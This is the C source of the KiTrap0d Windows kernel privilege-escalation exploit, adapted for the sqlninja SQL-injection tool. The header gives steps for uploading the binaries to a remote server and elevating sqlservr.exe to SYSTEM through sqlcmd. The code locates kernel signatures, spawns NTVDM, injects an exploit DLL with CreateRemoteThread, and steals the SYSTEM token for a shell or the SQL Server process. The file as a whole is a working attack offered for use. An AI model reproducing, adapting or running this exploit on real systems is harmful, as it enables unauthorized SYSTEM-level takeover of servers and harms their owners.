// 
// --------------------------------------------------
// KiTrap0d ring0 exploit, sqlninja edition
// --------------------------------------------  ---
//
// Original code by Tavis Ormandy, taviso@sdf.lonestar.org
// Silly hacks by icesurfer, r00t@northernfortress.net

// How to use
// 1. Upload vdmallowed.exe and vdmexploit.dll to the %TEMP% directory of the remote server
// 2. run "%TEMP%\vdmallowed.exe sql" through sqlcmd to escalate sqlservr.exe to SYSTEM
// 3. Have fun!

// TODO
// - tests against other platforms (only tested on w2k3 so far)
// - make it more resilient in case uploads are not to %TEMP%

// Massive kudos to Tavis for finding the bug, crafting the original exploit, 
// and for allowing me to modify it, GPL it, and include it in sqlninja :)

/*
 * This file is part of sqlninja.
 * 
 * Sqlninja is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Sqlninja is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with sqlninja. If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS // I prefer the definitions from ntstatus.h
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#include <stdarg.h>
#include <tlhelp32.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>

#pragma comment(lib, "advapi32")

#define PAGE_SIZE 0x1000



enum { SystemModuleInformation = 11 };

typedef struct {
    ULONG   Unknown1;
    ULONG   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
 
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
    
// These are generated using kd -kl -c 'db nt!Ki386BiosCallReturnAddress;q'
static CONST UCHAR CodeSignatures[][16] = {
    { "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00" }, // Windows NT4
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84" }, // Windows 2000
    { "\x64\xA1\x1C\x00\x00\x00\x5F\x8B\x70\x04\xB9\x84\x00\x00\x00\x89" }, // Windows 2000 SP4 AS 
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84" }, // Windows XP
    { "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00" }, // Windows 2003s
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows Vista
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows 2008
    { "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00" }, // Windows 7
};

// Log levels.
typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;

BOOL PrepareProcessForSystemToken(PCHAR App, char * Command, PDWORD ProcessId);
BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR Application, PHANDLE ProcessHandle);
BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread);
BOOL LogMessage(LEVEL Level, PCHAR Format, ...);
BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase);
int GetSQLProcess();
BOOL CheckProcessName( DWORD processID, LPCTSTR pszProcess );

//using namespace std; 

int main(int argc, char **argv)
{
    HANDLE VdmHandle;
    HANDLE RemoteThread;
    DWORD ShellPid;
    DWORD ThreadCode;
    DWORD KernelBase;
    CHAR Buf[32];
	char * tempdir;
	char * dllpath;
	char * sysroot;
	char * debugpath;
	char * cmdpath;
    DWORD Offset;
	PCHAR Command;
    LogMessage(L_INFO,
        "\r"
        "--------------------------------------------------\n"
        "Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit\n"
        "-------------------------------------------- taviso@sdf.lonestar.org ---\n"
        "\n"
    );

	// Create paths for vdmexploit.dll, cmd.exe and debug.exe
	tempdir = getenv("TEMP");
	dllpath = malloc(strlen(tempdir) + 20); // I like some extra space :)
	strcpy(dllpath,tempdir);
	strcat(dllpath,"\\VDMEXPLOIT.DLL");

	sysroot = getenv("SYSTEMROOT");
	debugpath = malloc(strlen(sysroot) + 30);
	strcpy(debugpath,sysroot);
	strcat(debugpath,"\\SYSTEM32\\DEBUG.EXE");

	cmdpath = malloc(strlen(sysroot) + 30);
	strcpy(cmdpath,sysroot);
	strcat(cmdpath,"\\SYSTEM32\\CMD.EXE");
		
    // Spawn the process to be elevated to SYSTEM.
    LogMessage(L_INFO, "Spawning a shell to give SYSTEM token (do not close it)");
	
	if (argc > 1) {
		Command = (PCHAR)argv[1];
	} else {
		Command = NULL;
	}

    if (PrepareProcessForSystemToken(cmdpath, Command, &ShellPid) != TRUE) {
        LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
        goto finished;
    }

    // Scan kernel image for the required code sequence, and find the base address.
    if (ScanForCodeSignature(&KernelBase, &Offset) == FALSE) {
        LogMessage(L_ERROR, "ScanForCodeSignature() returned failure");
        goto finished;
    }

    // Pass the parameters required by exploit thread to NTVDM.
    SetEnvironmentVariable("VDM_TARGET_PID", (sprintf(Buf, "%#x", ShellPid), Buf));
    SetEnvironmentVariable("VDM_TARGET_KRN", (sprintf(Buf, "%#x", KernelBase), Buf));
    SetEnvironmentVariable("VDM_TARGET_OFF", (sprintf(Buf, "%#x", Offset), Buf));

    // Invoke the NTVDM subsystem, by launching any MS-DOS executable.
    LogMessage(L_INFO, "Starting the NTVDM subsystem by launching MS-DOS executable");

    if (SpawnNTVDMAndGetUsefulAccess(debugpath, &VdmHandle) == FALSE) {
        LogMessage(L_ERROR, "SpawnNTVDMAndGetUsefulAccess() returned failure");
        goto finished;
    }

    // Start the exploit thread in the NTVDM process.
    LogMessage(L_DEBUG, "Injecting the exploit thread into NTVDM subsystem @%#x", VdmHandle);

	if (InjectDLLIntoProcess(dllpath, VdmHandle, &RemoteThread) == FALSE) {
        LogMessage(L_ERROR, "InjectDLLIntoProcess() returned failure");
        goto finished;
    }

    // Wait for the thread to complete
    LogMessage(L_DEBUG, "WaitForSingleObject(%#x, INFINITE);", RemoteThread);

    WaitForSingleObject(RemoteThread, INFINITE);

    // I pass some information back via the exit code to indicate what happened.
    GetExitCodeThread(RemoteThread, &ThreadCode);

    LogMessage(L_DEBUG, "GetExitCodeThread(%#x, %p); => %#x", RemoteThread, &ThreadCode, ThreadCode);

    switch (ThreadCode) {
        case 'VTIB':
            // A data structure supplied to the kernel called VDM_TIB has to have a `size` field that
            // matches what the kernel expects.
            // Try running `kd -kl -c 'uf nt!VdmpGetVdmTib;q'` and looking for the size comparison.
            LogMessage(L_ERROR, "The exploit thread was unable to find the size of the VDM_TIB structure");
            break;
        case 'NTAV':
            // NtAllocateVirtualMemory() can usually be used to map the NULL page, which NtVdmControl()
            // expects to be present.
            // The exploit thread reports it didn't work.
            LogMessage(L_ERROR, "The exploit thread was unable to map the virtual 8086 address space");
            break;
        case 'VDMC':
            // NtVdmControl() must be initialised before you can begin vm86 execution, but it failed.
            // It's entirely undocumented, so you'll have to use kd to step through it and find out why
            // it's failing.
            LogMessage(L_ERROR, "The exploit thread reports NtVdmControl() failed");
            break;
        case 'LPID':
            // This exploit will try to transplant the token from PsInitialSystemProcess on to an
            // unprivileged process owned by you.
            // PsLookupProcessByProcessId() failed when trying to find your process.
            LogMessage(L_ERROR, "The exploit thread reports that PsLookupProcessByProcessId() failed");
            break;
        case FALSE:
            // This probably means LoadLibrary() failed, perhaps the exploit dll could not be found?
            // Verify the vdmexploit.dll file exists, is readable and is in a suitable location.
            LogMessage(L_ERROR, "The exploit thread was unable to load the injected dll");
            break;
        case 'w00t': 
            // This means the exploit payload was executed at ring0 and succeeded.
            LogMessage(L_INFO, "The exploit thread reports exploitation was successful");
            LogMessage(L_INFO, "w00t! You can now use the shell opened earlier");
            break;
        default:
            // Unknown error. Sorry, you're on your own.
            LogMessage(L_ERROR, "The exploit thread returned an unexpected error, %#x", ThreadCode);
            break;
    }

    TerminateProcess(VdmHandle, 0);
    CloseHandle(VdmHandle);
    CloseHandle(RemoteThread);

finished:
    // LogMessage(L_INFO, "Press any key to exit...");
    // getch();
    return 0;
}

// Start a process to give SYSTEM token to.
static BOOL PrepareProcessForSystemToken(PCHAR App, char * Command, PDWORD ProcessId)
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFO si = { sizeof si };
	PCHAR AppLine;
	if (Command == NULL) { // Standard Shell
		AppLine = App;
	} else if (strcmp(Command, "sql") == 0) { // Escalate SQL Server
		*ProcessId = GetSQLProcess();
		printf("SQL Server PID appears to be %i\n",*ProcessId);
		return TRUE;
	} else { // Execute command
		AppLine = malloc(sizeof(char)*1000);
		AppLine[0] = 0x0;
		strncat(AppLine,App,30);
		strncat(AppLine," /C \"",5);
		strncat(AppLine,Command,900);
		strncat(AppLine,"\"",1);
		printf(AppLine);
		printf("\n");
	}

    if (CreateProcess(App, AppLine, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == FALSE) {
        LogMessage(L_ERROR, "CreateProcess(\"%s\") returned failure, %#x", App, GetLastError());
        return FALSE;
    }

    LogMessage(L_DEBUG, "CreateProcess(\"%s\") => %u", App, pi.dwProcessId);

    *ProcessId = pi.dwProcessId;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}
 

// Grab a useful Handle to NTVDM.
static BOOL SpawnNTVDMAndGetUsefulAccess(PCHAR App, PHANDLE ProcessHandle)
{
    PROCESS_INFORMATION pi = {0};
    STARTUPINFO si = { sizeof si };
    ULONG i;

    // Start the child process, which should invoke NTVDM.
    if (CreateProcess(App, App, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == FALSE) {
        LogMessage(L_ERROR, "CreateProcess(\"%s\") failed, %#x", App, GetLastError());
        return FALSE;
    }

    LogMessage(L_DEBUG, "CreateProcess(\"%s\") => %u", App, pi.dwProcessId);

    // Get more access
    if ((*ProcessHandle = OpenProcess(PROCESS_CREATE_THREAD
                                        | PROCESS_QUERY_INFORMATION
                                        | PROCESS_VM_OPERATION
                                        | PROCESS_VM_WRITE
                                        | PROCESS_VM_READ
                                        | PROCESS_TERMINATE,
                                      FALSE,
                                      pi.dwProcessId)) == NULL) {
        LogMessage(L_ERROR, "OpenProcess(%u) failed, %#x", pi.dwProcessId, GetLastError());
        TerminateProcess(pi.hProcess, 'SPWN');
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    LogMessage(L_DEBUG, "OpenProcess(%u) => %#x", pi.dwProcessId, *ProcessHandle);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}

// Use the DLL Injection technique to access the NTVDM process. 
// http://en.wikipedia.org/wiki/DLL_injection
static BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE RemoteThread)
{
    PVOID RemotePage;
    LPTHREAD_START_ROUTINE StartRoutine;

    assert(ProcessHandle != INVALID_HANDLE_VALUE);
    assert(DllPath);
    assert(RemoteThread);

    // Allocate a page in the child process
    if ((RemotePage = VirtualAllocEx(ProcessHandle, NULL, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE)) == NULL) {
        LogMessage(L_ERROR, "VirtualAllocEx() returned failure, %#x", GetLastError());
        return FALSE;
    }

    // Write in the name of my DLL (note, memory is already zeroed)
    if (WriteProcessMemory(ProcessHandle, RemotePage, DllPath, strlen(DllPath), NULL) == FALSE) {
        LogMessage(L_ERROR, "WriteProcessMemory(%p) returned failure, %#x", RemotePage, GetLastError());
        return FALSE;
    }

    LogMessage(L_DEBUG, "WriteProcessMemory(%#x, %#x, \"%s\", %u);",
                        ProcessHandle,
                        RemotePage,
                        DllPath,
                        strlen(DllPath));

    // Execute it in child process, loading the specified library
    *RemoteThread = CreateRemoteThread(ProcessHandle,
                                       NULL,
                                       0,
                                       (LPTHREAD_START_ROUTINE)
                                           GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "LoadLibraryA"),
                                       RemotePage,
                                       0,
                                       NULL);

    return *RemoteThread != NULL;
}

// Scan the appropriate kernel image for the correct offset
BOOL ScanForCodeSignature(PDWORD KernelBase, PDWORD OffsetFromBase)
{
    FARPROC NtQuerySystemInformation;
    HMODULE KernelHandle;
    PIMAGE_DOS_HEADER DosHeader;
    PIMAGE_NT_HEADERS PeHeader;
    PIMAGE_OPTIONAL_HEADER OptHeader;
    OSVERSIONINFO osvi = { sizeof osvi };
    PBYTE ImageBase;
    DWORD PhysicalAddressExtensions, DataSize;
    ULONG i;
    HKEY MmHandle;
    SYSTEM_MODULE_INFORMATION ModuleInfo = {0};

    // List of versions I have code signatures for.
    enum {
        MICROSOFT_WINDOWS_NT4   = 0,
        MICROSOFT_WINDOWS_2000  = 1,
        MICROSOFT_WINDOWS_XP    = 2,
        MICROSOFT_WINDOWS_2003  = 3,
        MICROSOFT_WINDOWS_VISTA = 4,
        MICROSOFT_WINDOWS_2008  = 5,
        MICROSOFT_WINDOWS_7     = 6,
    } Version = MICROSOFT_WINDOWS_7;

    // NtQuerySystemInformation can be used to find kernel base address
    NtQuerySystemInformation = GetProcAddress(GetModuleHandle("NTDLL"), "NtQuerySystemInformation");

    // Determine kernel version so that the correct code signature is used
    GetVersionEx(&osvi);
    
    LogMessage(L_DEBUG, "GetVersionEx() => %u.%u", osvi.dwMajorVersion, osvi.dwMinorVersion);

    if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_NT4;
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_2000;
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
        Version = MICROSOFT_WINDOWS_XP;
    if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2)
        Version = MICROSOFT_WINDOWS_2003;
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_VISTA;
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
        Version = MICROSOFT_WINDOWS_2008;
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
        Version = MICROSOFT_WINDOWS_7;

    // Learn the loaded kernel (e.g. NTKRNLPA vs NTOSKRNL), and it's base address
    NtQuerySystemInformation(SystemModuleInformation, &ModuleInfo, sizeof ModuleInfo, NULL);

    LogMessage(L_DEBUG, "NtQuerySystemInformation() => %s@%p",
                        ModuleInfo.Module[0].ImageName,
                        ModuleInfo.Module[0].Base);

    // Load the kernel image specified
    if ((KernelHandle = LoadLibrary(strrchr(ModuleInfo.Module[0].ImageName, '\\') + 1)) == NULL) {
        LogMessage(L_ERROR, "LoadLibrary() returned failure, %#x", GetLastError());
        return FALSE;
    }

    // Parse image headers
    *KernelBase                 = (DWORD) ModuleInfo.Module[0].Base;
    ImageBase                   = (PBYTE) KernelHandle;
    DosHeader                   = (PIMAGE_DOS_HEADER)(ImageBase);
    PeHeader                    = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
    OptHeader                   = &PeHeader->OptionalHeader;

    LogMessage(L_DEBUG, "Searching for kernel %u.%u signature { %02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,%02hhx,... } ...",
                        osvi.dwMajorVersion,
                        osvi.dwMinorVersion,
                        CodeSignatures[Version][0],
						CodeSignatures[Version][1],
						CodeSignatures[Version][2],
						CodeSignatures[Version][3],
						CodeSignatures[Version][4],
						CodeSignatures[Version][5],
						CodeSignatures[Version][6],
						CodeSignatures[Version][7],
						CodeSignatures[Version][8],
						CodeSignatures[Version][9],
						CodeSignatures[Version][10],
						CodeSignatures[Version][11],
						CodeSignatures[Version][12],
						CodeSignatures[Version][13],
						CodeSignatures[Version][14],
                        CodeSignatures[Version][15]);

    // Scan for the appropriate signature
    for (i = OptHeader->BaseOfCode; i < OptHeader->SizeOfCode; i++) {
        if (memcmp(&ImageBase[i], CodeSignatures[5], sizeof CodeSignatures[5]) == 0) {
            LogMessage(L_INFO, "Signature found %#x bytes from kernel base", i);

            *OffsetFromBase = i;
            FreeLibrary(KernelHandle);
            return TRUE;
        }
    }

    LogMessage(L_ERROR, "Code not found, the signatures need to be updated for your kernel");
    
    FreeLibrary(KernelHandle);

    return FALSE;
}

// A quick logging routine for debug messages.
BOOL LogMessage(LEVEL Level, PCHAR Format, ...)
{
    CHAR Buffer[1024] = {0};
    va_list Args;

    va_start(Args, Format);
        vsnprintf_s(Buffer, sizeof Buffer, _TRUNCATE, Format, Args);
    va_end(Args);

    switch (Level) {
        case L_DEBUG: fprintf(stdout, "[?] %s\n", Buffer); break;
        case L_INFO:  fprintf(stdout, "[+] %s\n", Buffer); break;
        case L_WARN:  fprintf(stderr, "[*] %s\n", Buffer); break;
        case L_ERROR: fprintf(stderr, "[!] %s\n\a", Buffer); break;
    }

    fflush(stdout);
    fflush(stderr);
 
    return TRUE;
}


unsigned int GetSQLProcess()
{
   PROCESSENTRY32   pe32;
    HANDLE         hSnapshot = NULL;

    pe32.dwSize = sizeof( PROCESSENTRY32 );
    hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if( Process32First( hSnapshot, &pe32 ) )
    {
        do{
			if( strcmp( pe32.szExeFile, "sqlservr.exe" ) == 0 )
                break;
        }while( Process32Next( hSnapshot, &pe32 ) );
    }

    if( hSnapshot != INVALID_HANDLE_VALUE )
        CloseHandle( hSnapshot );

    return pe32.th32ProcessID;

}

